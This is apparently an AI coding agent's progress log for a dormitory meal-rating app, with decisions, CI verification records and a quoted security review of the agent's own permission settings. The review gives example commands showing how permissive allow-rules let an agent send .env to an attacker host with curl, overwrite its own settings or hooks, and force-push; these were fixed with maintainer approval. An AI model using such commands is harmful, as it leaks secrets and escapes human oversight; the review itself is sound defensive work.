# KoliKaja – progress

Status legend: `[ ]` not started · `[~]` in progress · `[x]` done and verified · `[!]` done but NOT verified (reason given)

## Phase 1 – Foundation (completed 2026-11-26)
- [x] Inspect repository – no commits and no code existed; only instructions, skills and docs.
  Findings: no `.gitignore` (so `.env` was not ignored), no `.gitattributes` while `core.autocrlf=true`,
  `jq` missing so both hooks are inactive, Docker CLI present but daemon not running. Environment recorded
  in `docs/ENVIRONMENT.md`.
- [x] Write `docs/ARCHITECTURE.md` – 18 sections: layers, configuration, auth and sessions, authorization and
  tenant isolation, data model, photo pipeline, notifications, moderation, rate limits, contract, deployment,
  clients, licensing notes, extension points. 29 technical decisions recorded as T-01…T-29 in `docs/DECISIONS.md`.
- [x] Create folder structure – layout from ARCHITECTURE §2 with `.gitkeep` placeholders; added `.gitignore`,
  `.gitattributes` (LF), `.editorconfig`; hook scripts marked executable.
- [x] Define database schema (migrations 0001–0015, up and down) – 21 tables in 15 migrations
  (SPEC §6 tables + `refresh_tokens`, `password_reset_tokens`, `meal_categories`, `user_avatars`,
  `announcements`, `user_sanctions`; see T-12). Composite foreign keys as tenant backstop.
  Verified on real PostgreSQL 17.5 (embedded binaries) with golang-migrate v4.20.1, see the verification log.
  PostgreSQL inside Docker Compose: not verified (phase 3).
- [x] Define OpenAPI 3.1 contract (`docs/api/openapi.yaml`) – 84 paths, 112 operations, 136 schemas;
  `x-required-role`, `x-api-key-scopes`, `x-rate-limit` on operations. `redocly lint` passes.
  Client regeneration: not applicable yet (no client projects exist; `scripts/gen-clients.sh` is created in
  phases 4–6). Breaking-change check (`oasdiff`): not applicable (first version, tool not installed).
- [x] Legal audit (scoped to phase 1 files) – `docs/LEGAL_AUDIT.md`.
- [x] Security review of the design (`security-reviewer` subagent) – see "Security review" below.

### Security review (2026-11-26, phase 1 design)
The `security-reviewer` subagent reviewed `docs/ARCHITECTURE.md`, all migrations and the full contract.
Verdict before fixes: "blocking findings present" (no critical or high findings; 7 medium, 5 low, several info).
All findings were addressed in the design before committing; the reviewer was not run a second time.

| Severity | Finding | Resolution |
|----------|---------|------------|
| medium | Refresh did not check refresh-token expiry or session client type | Refresh algorithm rewritten (ARCHITECTURE §4.3): idle expiry enforced, client type must match endpoint, used token is always reuse; contract descriptions updated |
| medium | Empty `TRUSTED_PROXIES` default would merge all clients into one rate-limit key | Compose sets it to the fixed `frontend` subnet; right-most untrusted hop; Caddy overwrites `X-Forwarded-For`; warning when empty (§3.4, §11, §13) |
| medium | `/storage` on the app origin exposed cookies and a script-capable surface | Proxy forwards only `POST /storage/<bucket>`, strips `Cookie`/`Authorization`, adds `CSP: sandbox`, `nosniff`, attachment; policy returns 204; separate origin recommended (§8, T-28) |
| medium | Global admin could make themselves admin of any private dormitory | Only existing unbanned members, never self, no membership creation, required reason sent to dormitory staff; `joined_via = 'admin_assigned'` removed from the schema (§5.5, T-09) |
| medium | Admin reset tokens allowed silent takeover | No tokens for self or other global admins; owner notified (`account.password_reset_issued`); 32-byte tokens; consumed on password change and deletion (§4.8, T-08) |
| medium | API keys and invitations outlived their creator's admin rights | Revoked automatically in the same transaction when the creator loses the role (§4.7, T-16) |
| medium | Reported moderators/admins could see and dismiss reports about themselves | New `reports.subject_user_id`; routing by the subject's role; reports about admins auto-escalated (§10, T-29) |
| low | Sanction `user_id` not tied to the dormitory; report could concern another user | Must be current or former member (`404`); composite FK `(report_id, user_id)` → `reports (id, subject_user_id)` |
| low | Logout needed an unexpired access token | Logout accepts a validly signed expired access token; always clears cookies (§4.2) |
| low | Trusted average with one trusted rater revealed an individual rating; self-flagging | Trusted average only when ≥ 3 trusted ratings; nobody sets their own flag |
| low | `audit_logs` allowed TRUNCATE and any DELETE | Triggers reject TRUNCATE and DELETE of rows younger than 30 days; retention ≥ 30 days (T-21). DB role split stays a phase 3 option |
| low | Registration and e-mail change reveal registered addresses | Accepted risk, documented (T-27) |
| info | Draft-menu children, Origin `null`, API key parsing, single GET on complete, evidence of deleted reported photos, targeted login lockout, session data on account deletion, `menus:read` aggregates | All documented in ARCHITECTURE §4.4, §4.7, §4.8, §5.3, §8, §11 and the contract conventions |

Phase 2 must implement and test these rules; the authorization test tables in `apps/api/tests/authz/`
must cover the report routing, the sanction target rules and the global-admin assignment limits.

## Session 2 – repository split, CI, authorization matrix, security gates, UI direction (2026-11-26 – 2026-11-28)
No backend, web or mobile features were implemented (as instructed).
- [x] **Repository split (D-06).** `apps/android` and `apps/ios` with their CLAUDE.md files and skills moved to
  madarlevi/kolikaja-android and madarlevi/kolikaja-ios; `CLAUDE.md`, `ARCHITECTURE.md`, skills and agents of
  this repository updated. Decisions D-06…D-12 and T-30…T-44 recorded.
- [x] **LICENSE**: official text downloaded with `curl -fsSL https://www.gnu.org/licenses/agpl-3.0.txt`, never
  edited: 34 523 bytes, SHA-256 `0d96a4ff68ad6d4b6f1f30f713b18d5184912ba8dd389f86aa7710db079abcb0`; the same
  bytes are in all three repositories.
- [x] **Authorization matrix** `docs/api/authz-matrix.md`: 112 rows for 112 operations, generated from the
  contract; `scripts/check-authz-matrix.sh` passes locally and in CI. 70 dormitory-scoped or
  membership-derived operations, every one with a planned `TestAuthz_<OperationId>` test (0 implemented).
- [x] **Security tooling** configured and described in `docs/SECURITY-PLAN.md`: gitleaks, golangci-lint with
  gosec, gosec, govulncheck, Semgrep with custom SQL rules (rule tests in CI), CodeQL + `code-scanning-gate`,
  dependency review, npm audit + eslint-plugin-security (active in phase 4), OWASP ZAP baseline (active in
  phase 3), payload harness `apps/api/tests/security` (13 SQL injection + 9 XSS payloads, endpoint list from
  the contract; request tests skipped until the API runs).
- [x] **CI** `.github/workflows/ci.yml`, **release** `.github/workflows/release.yml`, Dependabot, issue
  templates, pull request template; actionlint clean; first CI run on PR #1 – see the verification log.
- [x] **Migrations verified through a container (resolves the phase 1 "not verified" entry, D-08)**: CI job
  "Migrations and schema constraints (PostgreSQL 17)" runs golang-migrate up/down/up and the integration
  tests on a `postgres:17-alpine` service container (run URL in the verification log).
- [x] **UI direction** `docs/DESIGN.md` (documentation only); component library T-30 **to confirm**.
- [x] **Security gate**: `security-reviewer` re-run (below); both high findings fixed, medium and low fixed or
  recorded (T-43, T-44); all CI security jobs green on PR #1 before merge.
- [x] Contract `info.version` 0.1.0; release `v0.1.0` with `openapi-v0.1.0.yaml` – see the verification log.

### Security review – re-run (2026-11-28)
Run by the `security-reviewer` subagent after the repository split and the authorization matrix existed
(started 2026-11-26, interrupted by a rate limit, resumed and finished 2026-11-28). Full report as delivered:

```
KoliKaja security re-run (session 2): design and configuration review, read-only
There are 2 HIGH findings, 5 medium and 5 low. Both HIGH findings are in the agent permission settings and
must be fixed before this session ends.

[SEVERITY: high] The deny rules do not stop force-push, remote deletion or tag pushes
File: .claude/settings.json:30-31, 44-52 (the same in kolikaja-android/.claude/settings.json:15-16 and
      kolikaja-ios/.claude/settings.json:16-17)
Problem: `git push origin:*` and `git push -u origin:*` are prefix allows. The deny rules only catch commands
that start with the denied flag. All of these are auto-approved: `git push origin main --force`,
`git push origin +main`, `git push origin -d feat` and `git push origin feat --delete`,
`git push origin --mirror` and `--prune`, `git push -u origin x -f`, `git push origin v0.2.0` (starts
release.yml, publishes a release and GHCR images that can never be deleted under D-07). No branch or tag
ruleset is documented anywhere, so nothing on the server side stops these either. This breaks D-07 and D-12.
Fix suggestion: Remove both push allows so pushes ask for approval, or allow only exact
`git push -u origin <current-branch>` forms. The maintainer should enable rulesets on `main` and `v*` tags
(block force-push and deletion, require PR and status checks).

[SEVERITY: high] The curl, find and cat allows let the agent exfiltrate secrets and rewrite its own config
File: .claude/settings.json:32, 34, 36-37 (mobile: cat/grep/find)
Problem: `curl -fsSL https://www.gnu.org/licenses/agpl-3.0.txt:*` accepts any extra arguments, e.g.
`... https://evil.example -d @.env` sends a file out, and `... -o .claude/settings.json` or
`-o .git/hooks/pre-commit` overwrites files (self-escalation or code execution). `Read(./.env)` deny rules do
not cover Bash, so `cat .env` is allowed. `find:*` allows `-delete` and `-exec <any command>` unless Claude
Code flags those itself.
Fix suggestion: Replace the curl rule with a fixed script or delete it. Drop the `find:*` and `cat:*` allows,
or enable sandboxing with filesystem and network deny rules.

[SEVERITY: medium] The gate does not actually enforce "no open high/critical"
File: docs/SECURITY-PLAN.md:8-17, 28; .github/workflows/ci.yml:280-282, 307-318, 38-59
Problem: CodeQL `analyze` uploads alerts but never fails the job; dependency review is red (HTTP 403,
dependency graph disabled); no required status checks exist; the `detect` job turns jobs into "skipped",
which counts as passing – deleting `apps/api/go.mod` in a PR would silently switch off every Go security job.
Fix suggestion: Enable the dependency graph and code-scanning merge protection (or check open alerts in CI
through `gh api`), configure required checks, list open code-scanning alerts in the gate record, never use
`continue-on-error` on security jobs.

[SEVERITY: medium] The authz-matrix check can never fail on missing tests
File: apps/api/internal/authzmatrix/matrix.go:86-94, 275-279
Problem: Every non-public operation gets "planned: TestAuthz_X", so the check is always satisfied; a row
switches to "implemented" as soon as a function with that name exists, even an empty one; nothing fails when
phase 2 ends with tests still planned.
Fix suggestion: Add a mode that fails while any scoped row is still planned; have tests register the cases
they cover and check those.

[SEVERITY: medium] Some operations are classified wrongly, and same-dormitory cross-user tests are missing
File: matrix.go:135-159; .claude/skills/authz-tenant-isolation/SKILL.md:24-30
Problem: `/me/notifications*` is marked "own data" although notifications carry `dormitory_id` and are
filtered by active membership; `adminAssignDormitoryAdmin`, `adminResolveReport` and `adminDeleteDormitory`
change tenant data but the matrix only says "global_admin"; same-dormitory BOLA cases have no ownership column
and no test template (`updateComment`, `deleteComment`, `deletePhoto`, `completePhotoUpload`,
`revokeMySession`, `markNotificationRead`, `completeAvatarUpload`); any new top-level path falls through to
"no / n/a" without an error.
Fix suggestion: Reclassify the notification paths, add an ownership column and an "other user's resource →
404" test case, make unknown path prefixes fail the generator.

[SEVERITY: medium] The global-admin limits can be bypassed by demoting first
File: docs/api/openapi.yaml:3209, 3248, 3289; docs/ARCHITECTURE.md:262-270
Problem: Any global admin can demote another (only the last one is protected); afterwards reset tokens and
sanctions against that user are allowed. The "made visible" control for taking over an ordinary account is a
notification inside the account being taken over, which the attacker can mark read.
Fix suggestion: Block reset tokens and sanctions for anyone who was a global admin in the last N days, notify
all global admins on demotion, show reset events outside the taken-over account.

[SEVERITY: medium] The release workflow does not tie releases to `main` or to a passing CI run
File: .github/workflows/release.yml:29-41, 57-63
Problem: Any `v*` tag on any commit publishes a release; the `images` job has no `needs: contract`, so images
are pushed even when the tag/version check fails. Releases are permanent.
Fix suggestion: Check that the tagged commit is an ancestor of `origin/main`, add `needs: contract`, use a
protected `release` environment with a required reviewer.

[SEVERITY: low] The migration test wipes whatever database it is pointed at
File: apps/api/tests/integration/migrations_test.go:84 – `m.Down()` without a guard.
Fix suggestion: Refuse unless the database is empty or its name matches *_test / *_ci.

[SEVERITY: low] Escalated reports can reach their own subject
File: openapi.yaml:3502, 3534 – a global admin who is also a dormitory admin receives escalated reports about
themselves, including the reporter's identity.
Fix suggestion: Exclude reports whose subject is the caller and document it.

[SEVERITY: low] The Semgrep SQL rule is easy to evade, and test code is not scanned
File: .semgrep/go-sql-string-building.yml:22-41 – misses `q = fmt.Sprintf(...)`, `var q =`, `q = q + x`,
`q := sb.String()`, context-free variable forms, `strings.Join/Replace`; no `.semgrepignore`, so the default
ignore skips tests/ and *_test.go.
Fix suggestion: Taint-mode rule; add a `.semgrepignore`.

[SEVERITY: low] The secret-file hooks fail open
File: .claude/hooks/block-secret-files.sh:8 (all three repositories) – jq is missing so the hook does nothing;
`.env.staging` and similar names are not covered; no Edit(./.env*) deny rules.
Fix suggestion: Fail closed when jq is missing; add Edit/Write deny rules.

[SEVERITY: low] Some build tools are fetched at run time without a pin or hash
File: ci.yml:88, 242; mobile scripts/gen-client.sh:41; mobile ci.yml:85; ios ci.yml:137 – npx transitive
dependencies, the OpenAPI Generator JAR, semgrep from PyPI, the ZAP `stable` image, `go-version: stable`,
`brew install swiftlint`.
Fix suggestion: Pin with lockfiles or hashes where possible.

[SEVERITY: info] payloads.go:51 "unicode-escape" equals "script-tag"; ARCHITECTURE §12 says swift5 while the
iOS script uses swift6; audit_logs.occurred_at can be set by the application, so backdated rows can be
deleted at once.

Scope reviewed: ARCHITECTURE §3.4, §4, §5, §8, §11, §12, §19; migrations 0001-0005 and 0012-0015 in detail;
contract paths outside the dormitory prefix plus report, admin and export operations; all 112 matrix rows,
matrix.go, spec.go, the authzmatrix CLI and check-authz-matrix.sh (ran it: ok); ci.yml, release.yml,
Dependabot, CodeQL config, both mobile CIs, gen-client.sh and the pins (all 16 pinned action SHAs checked
against their upstream tags with git ls-remote: all match; contract SHA-256 matches openapi.yaml); the three
settings.json files and hooks; the security harness, migration test, Semgrep rules, .golangci.yml and the
three suppressions (acceptable); SECURITY-PLAN.md.
Not reviewed: migrations 0006-0011 line by line; every contract schema; DESIGN and DECISIONS beyond D-06–D-12;
constraints_test.go and endpoints.go; mobile CLAUDE.md files and security-reviewer agents; actual GitHub
repository settings and PR #1 run logs; runtime behaviour (no implementation yet).
Verdict: blocking findings present (2 high). This report lists what was checked; it does not say the design
is secure.
```

| Severity | Finding | Resolution |
|----------|---------|------------|
| **high** | Push allows auto-approve force pushes, deletions and tag pushes | **Fixed** (maintainer approved, D-12): `git push origin:*` and `git push -u origin:*` allows removed in all three repositories; every push goes through the normal permission check. Rulesets for `main` and `v*` recommended to the maintainer (SECURITY-PLAN §7). |
| **high** | curl, cat and find allows allow exfiltration and config rewrites | **Fixed** (maintainer approved): curl rule (LICENSE already fetched), `cat:*` and `find:*` removed in all three repositories. Residual: `grep:*` (T-44 (3)). |
| medium | Gate does not enforce "no open high/critical" | **Fixed**: `code-scanning-gate` job; Go, migration and CodeQL Go jobs unconditional; dependency graph enabled by the maintainer (dependency review green); required checks and merge protection recommended (T-44 (1)). |
| medium | Matrix check cannot fail on missing tests | **Fixed**: `AUTHZ_REQUIRE_TESTS=1` / `-require-tests` (fails on 70 planned rows today; switched on when phase 2 closes). Empty test functions: T-44 (5). |
| medium | Misclassified operations, no ownership checks, unknown prefixes pass | **Fixed**: `/me/notifications*` derived from memberships; object-level checks in the "Tenant check" column for 28 operations; unknown path prefixes fail the generator; skill template has the same-dormitory "other member's resource" case. |
| medium | Global-admin limits bypassable by demotion | **Fixed** (design): no reset tokens or sanctions for users who were global admins in the last 30 days; `admin.oversight` notifications to all other global admins on grants, revocations, reset tokens and instance-wide sanctions (migration 0012, contract, ARCHITECTURE §4.8, §5.5). |
| medium | Release not tied to `main` | **Fixed**: ancestor-of-`origin/main` check; `images` needs `contract`. Protected `release` environment recommended (T-44 (1)). |
| low | Migration test wipes any database | **Fixed**: refuses databases not ending in `_test`, `_ci` or `_it`. |
| low | Escalated reports reach their subject | **Fixed** (contract and ARCHITECTURE §5.5, §10). |
| low | Semgrep rule evasions; tests not scanned | **Fixed**: 11 more patterns with test cases; `.semgrepignore` so test code is scanned. Taint mode deferred. |
| low | Hooks fail open | **Recorded** (T-44 (2)): fail-closed would block every edit until `jq` is installed; maintainer installs `jq`. |
| low | Unpinned run-time downloads | **Partly fixed**: mobile `go-version` pinned to 1.27.4; the rest recorded (T-44 (4)). |
| info | Duplicate payload; swift5 note; backdated audit rows | False positive (T-44 (7)); ARCHITECTURE §12 corrected; deferred to phases 2–3 (T-44 (6)). |

Not re-reviewed by the subagent after the fixes; the CI run on the fixed commit is the verification.

## Phase 2 – Backend
- [ ] Config loading, fail-fast on missing secrets
- [ ] Auth: register, login, logout, refresh rotation, reuse detection, sessions, password change, account deletion
- [ ] Users: profile, avatar upload, statistics, reputation, trusted reviewer
- [ ] Dormitories: CRUD, search, join/leave, invitations, membership, dormitory settings
- [ ] Roles and RBAC (member, moderator, dormitory admin, global admin)
- [ ] Menus and meals (daily/weekly, categories, allergens, publishing)
- [ ] Ratings (1–5, one active per user per meal, DB unique constraint, distribution)
- [ ] Comments (pagination, edit/delete own, moderator delete, reports)
- [ ] Photos (MinIO, presigned upload, validation, moderator removal)
- [ ] Recommendations (separate from rating)
- [ ] Moderation (reports, review queue, suspension, audit log)
- [ ] In-app notifications
- [ ] API keys for server-to-server (hashed, scoped, expiring, rate limited)
- [ ] Rate limiting, security headers, CORS, CSRF
- [ ] Authorization tests for cross-dormitory access

## Phase 3 – Infrastructure
- [ ] API Dockerfile (non-root, multi-stage)
- [ ] Web Dockerfile
- [ ] docker-compose.yml with PostgreSQL, MinIO, migrations job, health checks, restart policies, volumes
- [ ] `.env.example` with placeholders only
- [ ] Backup and restore scripts

## Phase 4 – Web application
- [ ] Project setup (Vite, React, TypeScript, Tailwind, React Router, TanStack Query)
- [ ] i18n with Hungarian default and English
- [ ] Pages 1–13 from SPEC §7
- [ ] PWA installation
- [ ] Tests

## Phase 5 – Android application
Moved to madarlevi/kolikaja-android (D-06); tracked in its `docs/PROGRESS.md`.

## Phase 6 – iOS application
Moved to madarlevi/kolikaja-ios (D-06); tracked in its `docs/PROGRESS.md`.

## Phase 7 – Documentation and legal
- [ ] README, CONTRIBUTING, CODE_OF_CONDUCT, SECURITY (placeholder contact; preliminary `SECURITY.md` exists), DISCLAIMER, PRIVACY (template), THIRD_PARTY_LICENSES, COPYRIGHT, TRADEMARKS.md
- [x] LICENSE (unmodified official AGPL text; SHA-256 `0d96a4ff68ad6d4b6f1f30f713b18d5184912ba8dd389f86aa7710db079abcb0`, recorded in session 2)
- [x] GitHub issue and PR templates (session 2)
- [ ] `legal-audit` run and findings resolved
- [ ] Final release checklist (SPEC §16)

## Open items for the maintainer
1. **Install `jq`** (or tell the agent to rewrite the hooks without it). Until then
   `.claude/hooks/block-secret-files.sh` does not block writes to `.env` or key files and
   `format-on-edit.sh` does not format.
2. **Android application ID** `io.github.madarlevi.kolikaja` (T-24): confirm or choose another before the
   first store release; it cannot change afterwards.
3. **MinIO server distribution**: check in phase 3 which maintained MinIO images are available and under
   which terms (ARCHITECTURE §18). The API only uses the S3 API, so another S3-compatible server could be used.
4. **Review the agent decisions T-01…T-29** in `docs/DECISIONS.md`, especially T-08 (admin-issued password
   reset, no e-mail), T-10 (only global administrators create dormitories by default), T-14 (individual
   ratings are private), T-27 (accepted account-enumeration risk) and T-28 (storage on the app origin by
   default, separate origin optional).
5. `docs/SPEC.md` §15.1 says AGPL-3.0-or-later; D-04 (AGPL-3.0-only) is applied everywhere. No action unless
   the maintainer wants to change D-04.
6. `TODO(operator)` values for deployments: privacy policy URL, terms URL, trademarks URL, operator contact and,
   for modified versions, `SOURCE_CODE_URL` (ARCHITECTURE §3.4, §16).
7. **Repository settings** (agent may not change them, D-07; details in `docs/SECURITY-PLAN.md` §7), for all
   three repositories: rulesets for `main` (PR + required status checks, no force push or deletion) and `v*`
   tags (no deletion or update), code-scanning merge protection, a `release` environment with a required
   reviewer, private vulnerability reporting, dependency graph + Dependabot alerts on the mobile repositories.
8. **Security contact** for the three `SECURITY.md` files (`TODO(operator)`).
9. **Confirm T-30** (Tailwind + Radix UI in the shadcn/ui style) before phase 4.
10. Decide on the remaining `Bash(grep:*)` allow (T-44 (3)); recommendation: remove it.
11. Review decisions T-30…T-44 (session 2).

## Verification log
| Date | Step | Result |
|------|------|--------|
| 2026-11-26 | Toolchain check | Go 1.26.5, Node 24.13.1, npm 11.21.0, Java 21, Python 3.13.5 available; Docker daemon, PostgreSQL server, `jq`, `golangci-lint`, `migrate`, `hadolint` not available. |
| 2026-11-26 | Migrations on PostgreSQL 17.5 (embedded-postgres v1.34.0, golang-migrate v4.20.1, scratch harness outside the repo) | PASS: fresh `up` to version 15; `down 1` → 14; `up`; schema fingerprint identical; every step `down` to empty database (no tables or functions left); step-wise `up`; fingerprint identical again (10/10 checks). |
| 2026-11-26 | Schema constraint tests (same harness, each case in a rolled-back transaction) – first run | PASS 34/34 on the initial schema. |
| 2026-11-26 | Migrations and constraint tests after the security-review fixes (final schema) | PASS: 10/10 migration checks and 42/42 constraint tests. Duplicate active rating rejected; re-rating after soft delete allowed; `ON CONFLICT … WHERE deleted_at IS NULL` upsert works; rating 6 rejected; cross-tenant rating, comment, meal, report and sanction rejected by composite FKs; sanction citing a report about another user rejected and about the same user accepted; duplicate open report, self report, report on own content, user report with mismatching subject, membership via global-admin assignment, second active membership, unknown role, private+open dormitory, case-insensitive duplicate e-mail, plaintext password, unscrubbed deleted account, unknown allergen, duplicate menu slot, published menu without timestamp, second unused refresh token, short token hash, instance API key with write scope, malformed audit action and non-object notification payload rejected; audit log UPDATE, TRUNCATE and DELETE of recent rows rejected, DELETE of rows older than 30 days allowed; UTF-8 names stored. |
| 2026-11-26 | `npx @redocly/cli@2.84.0 lint docs/api/openapi.yaml` (before and after the security-review fixes) | PASS: valid, 0 errors, 0 warnings; 2 problems explicitly ignored (`/healthz`, `/readyz` have no 4XX, T-17). |
| 2026-11-26 | Project-rule contract checks (scratch Python script, before and after the fixes) | PASS on 112 operations and 36 request schemas: every unsafe cookie operation requires `csrfToken`; API key operations declare scopes and never reach `/admin`; authenticated operations document 401, role-restricted ones 403, dormitory-scoped ones 404; request bodies reject unknown fields and bound every string, integer and array; rating labels present verbatim. |
| 2026-11-26 | Second OpenAPI 3.1 schema validator (`@seriousme/openapi-schema-validator`) | NOT RUN: blocked by the Claude Code permission policy; not worked around. |
| 2026-11-26 | Migrations through Docker Compose `migrate` job | Superseded: the migrations are verified in a PostgreSQL 17 container by CI (session 2 rows below); the Compose `migrate` job itself is written in phase 3 and verified by the CI `docker` job then. |
| 2026-11-26 | Legal audit (scoped) | PASS for headers, identifier, copyright, ® and claims; other checks NOT CHECKED until phase 7 (`docs/LEGAL_AUDIT.md`). |
| 2026-11-26 | `security-reviewer` subagent on the phase 1 design | 7 medium, 5 low findings; all addressed (see "Security review"). Re-review of the fixes: not run. |
| 2026-11-26 | Session 2 local checks (Go 1.27.4) | PASS: gofmt, go vet, go test ./..., golangci-lint v2.15.0 (0 issues), gosec v2.30.0 (0), govulncheck v1.10.0 (no vulnerabilities; go1.26.5 had 23 unreachable stdlib vulnerabilities, hence T-34), Redocly lint, authorization matrix (112/112), actionlint v1.7.12 (all three repositories). |
| 2026-11-26 | Integration tests against PostgreSQL 17.5 (embedded, local) | PASS: TestMigrationsUpDownUp; TestSchemaConstraints 42/42 subtests. |
| 2026-11-26 | Semgrep 1.187.0 (local) | PASS: custom rule tests (Go 5, TS 3 expected findings); full scan 0 findings. |
| 2026-11-26 | CI run on PR #1, first commit set: https://github.com/madarlevi/kolikaja/actions/runs/45886332995 | All jobs green (actionlint, OpenAPI + matrix, Go, migrations on `postgres:17-alpine` – resolves the phase 1 container entry, gitleaks, Semgrep, CodeQL Go) except Dependency review: HTTP 403, dependency graph disabled (enabled by the maintainer on 2026-11-28). Web, Docker, ZAP and CodeQL JS skipped (no code yet). |
| 2026-11-28 | `security-reviewer` re-run | 2 high, 5 medium, 5 low, info; high fixed, medium/low fixed or recorded (see "Security review – re-run"). |
| 2026-11-28 | Local checks after the re-run fixes | PASS: gofmt, vet, tests, golangci-lint 0, gosec 0, govulncheck clean, matrix 112/112, `AUTHZ_REQUIRE_TESTS=1` fails as expected (70 planned), Redocly valid, actionlint clean. Semgrep not re-run locally (scratch environment gone); CI runs the rule tests. |
| 2026-11-28 | CI run on PR #1 after the re-run fixes (commit a5c5216): https://github.com/madarlevi/kolikaja/actions/runs/46129622467 | All jobs green including Dependency review (dependency graph now enabled) and the new code-scanning gate, except actionlint: shellcheck SC2016 on a jq variable in the gate step; fixed in 68c9b0b. |
| 2026-11-28 | CI run on PR #1, final commit 68c9b0b: https://github.com/madarlevi/kolikaja/actions/runs/46129805645 | PASS: 11 jobs passed (actionlint, OpenAPI + matrix, Go, migrations on PostgreSQL 17, gitleaks, Semgrep incl. rule tests, CodeQL Go, code-scanning gate, dependency review, detect), 4 skipped (web, Docker, ZAP, CodeQL JS: no code yet). |
| 2026-11-28 | PR #1 squash-merged as e02ebaa; CI on main: https://github.com/madarlevi/kolikaja/actions/runs/46130015228 | PASS. |
| 2026-11-28 | Release v0.1.0 (tag on e02ebaa): workflow https://github.com/madarlevi/kolikaja/actions/runs/46130249178, release https://github.com/madarlevi/kolikaja/releases/tag/v0.1.0 | PASS: pre-release with `openapi-v0.1.0.yaml` (207 734 bytes, SHA-256 `90dc14413a731e0b943d4987c515d3db703b733915d50e4ac08f77c4e2a1f859`, matches `main` and the value pinned in both mobile repositories) and `openapi-v0.1.0.yaml.sha256`. Images job ran without Dockerfiles (steps skipped). From this tag on, migrations 0001–0015 are released (T-31). |
| 2026-11-28 | Mobile repositories pushed (first commit set directly to `main`, D-11) | kolikaja-android full run https://github.com/madarlevi/kolikaja-android/actions/runs/46130434700 and kolikaja-ios full run https://github.com/madarlevi/kolikaja-ios/actions/runs/46130436654: PASS (contract download from the v0.1.0 release, checksum, regenerated clients identical to the committed ones, `swift build` of the Swift package on macOS, gitleaks, actionlint). Their first push runs had gitleaks fail on the first-push range only; details in their `docs/PROGRESS.md`. |
